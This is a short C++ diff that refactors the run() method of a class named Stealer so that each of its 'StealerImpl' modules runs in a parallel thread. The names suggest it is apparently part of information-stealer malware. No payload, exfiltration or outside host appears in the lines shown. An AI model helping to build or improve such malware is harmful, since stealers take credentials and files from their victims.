@@ -26,8 +26,17 @@ Stealer::Stealer() {
 }
 
 void Stealer::run() {
-    for(StealerImpl* module : this->modules)
-    {
-        module->execute(this->root_dir);
+    std::vector<std::thread> threads;
+
+    for(StealerImpl* module : this->modules) {
+        threads.emplace_back([module, this]() {
+            module->execute(this->root_dir);
+        });
+    }
+
+    for(auto& thread : threads) {
+        if (thread.joinable()) {
+            thread.join();
+        }
     }
 }
